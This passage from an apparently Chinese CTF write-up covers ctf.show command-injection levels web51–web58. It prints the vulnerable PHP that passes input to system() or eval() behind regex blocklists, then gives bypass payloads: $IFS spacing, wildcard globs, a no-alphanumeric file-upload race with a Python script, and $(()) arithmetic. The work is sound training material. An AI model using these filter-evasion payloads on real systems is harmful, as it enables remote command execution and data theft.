</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;</p></blockquote>
<p>我测怎么连&lt; &gt;都要过滤</p>
<p>别忘了还可以用$IFS</p>
<pre tabindex="0"><code>ca%27%27t$IFS/fla%27%27g||
or
ca%27%27t$IFS/fla%27%27g%0a
</code></pre><h4 id="web52">web52<a hidden class="anchor" aria-hidden="true" href="#web52">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 18:21:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="nv">$d</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$d</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;no&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<blockquote>
<p>;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;/</p></blockquote>
<p>这题没有在后面进行命令拼接，其他和上一题一样</p>
<pre tabindex="0"><code>c%27%27at${IFS}fla%27%27g.php
</code></pre><h4 id="web54">web54<a hidden class="anchor" aria-hidden="true" href="#web54">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 19:43:42
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题过滤了很多命令,题目通过*使得只要是传入的内容出现如cat三个字符即可被匹配到，无法使用之前的字符拼接方法绕过</p>
<p>这题没过率通配符?</p>
<p>解一</p>
<pre tabindex="0"><code>/bin/?at${IFS}f???????
</code></pre><p>cat命令所在的路径是在/bin/目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面（一开始还傻傻的换成uniq看能不能用hhh）。</p>
<p>bin下的命令：<a href="https://www.cnblogs.com/cuiqi1314/articles/7339776.html">Linux /bin 目录下命令简要说明 - 崔旗 - 博客园</a></p>
<p>同理bin目录下还存在more，所以这里的cat我们换成more也可以读取flag。
解二</p>
<pre tabindex="0"><code>vi${IFS}fla?.php 
or
c=uniq${IFS}f???.php //倒序的
or
grep${IFS}%27fla%27${IFS}f???????%0a
</code></pre><h4 id="web55">web55<a hidden class="anchor" aria-hidden="true" href="#web55">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 20:03:51
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤了</p>
<pre tabindex="0"><code>\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/
</code></pre><p>这题涉及到一个知识点</p>
<p>也就是<strong>无字母数字的命令执行</strong></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108557067">https://blog.csdn.net/qq_46091464/article/details/108557067</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p>
<p>思路</p>
<blockquote>
<ol>
<li>shell下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ol></blockquote>
<p>我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过<code>.(点)</code>去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）</p>
<blockquote>
<pre tabindex="0"><code>注意：通过`.`去执行sh命令不需要有执行权限
</code></pre></blockquote>
<p>1.构造post数据包</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>POST数据包POC<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://f3a86e62-7402-4d1d-b950-0d6da4aa4eab.challenge.ctf.show/&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c">&lt;!--链接是当前打开的题目链接--&gt;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;</span>文件名：<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;提交&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在上传的文件里面写入sh指令</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="cp"></span>ls
</span></span></code></pre></div><p>2.抓包</p>
<p><img alt="image-20241127181502002" loading="lazy" src="../assets/image-20241127181502002.png"></p>
<p>3.构造执行sh命令的poc</p>
<p>详细解释poc的构造：</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob</a></p>
<p>我们这里可以理解为我们这道题里面的干扰文件名都是由小写字母组成的，所有文件名都是小写，只有PHP生成的临时文件包含大写字母，那我们就可以构造出如下的poc</p>
<pre tabindex="0"><code>?c=.+/???/????????[@-[]
</code></pre><p>注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。
<img alt="在这里插入图片描述" loading="lazy" src="../assets/fcbf237f846ebf0be65c4c9aceaf3714.png"></p>
<p>我们就来吧</p>
<p><img alt="image-20241127233056280" loading="lazy" src="../assets/image-20241127233056280.png"></p>
<p>修改一下指令内容即可得到flag</p>
<p><img alt="image-20241127233144783" loading="lazy" src="../assets/image-20241127233144783.png"></p>
<h4 id="web56">web56<a hidden class="anchor" aria-hidden="true" href="#web56">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|</span><span class="se">\\</span><span class="s2">$|\(|\{|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>;|[a-z]|[0-9]|\$|(|{|'|&quot;|`|%|\x09|\x26|&gt;|&lt;</p></blockquote>
<p>这题相比上一题多过滤了一个数字，不影响我们上题的解题方法</p>
<p>这里不再赘述</p>
<p>放个大佬的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">	<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]&#34;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;feng.txt&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cat flag.php&#39;</span><span class="p">)})</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl">	<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">8</span><span class="cl">		<span class="k">break</span>
</span></span></code></pre></div><h4 id="web57">web57<a hidden class="anchor" aria-hidden="true" href="#web57">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-08 01:02:56
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">// 还能炫的动吗？
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">//flag in 36.php
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|</span><span class="se">\x0a</span><span class="s2">|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat &#34;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>过滤条件增加</p>
<blockquote>
<p>;|[a-z]|[0-9]|`||#|'|&quot;|`|%|\x09|\x26|\x0a|&gt;|&lt;|.|,|?|*|-|=|[/</p></blockquote>
<p>这道题把<code>?</code>过滤了，但是我们可以看到</p>
<pre tabindex="0"><code>system(&#34;cat &#34;.$c.&#34;.php&#34;);
</code></pre><p>这题会将我们传入的get参数进行拼接后再执行</p>
<p>题目里有个暗示</p>
<pre tabindex="0"><code>//flag in 36.php
</code></pre><p>也就是说我们要用符号构造出36</p>
<p>我们可以利用linux的$(())构造出36</p>
<p>在linux里面$(())=0，$((~ $(()) ))=-1</p>
<p>其中~符号表示取反，这里0的取反等于－1</p>
<p>也就是我们先将36个-1加起来再取反得到我们需要的36</p>
<p>payload:</p>
<pre tabindex="0"><code>c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
</code></pre><p><img alt="image-20241128205205756" loading="lazy" src="../assets/image-20241128205205756.png"></p>
<p>从而得到flag</p>
<h4 id="web58">web58<a hidden class="anchor" aria-hidden="true" href="#web58">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
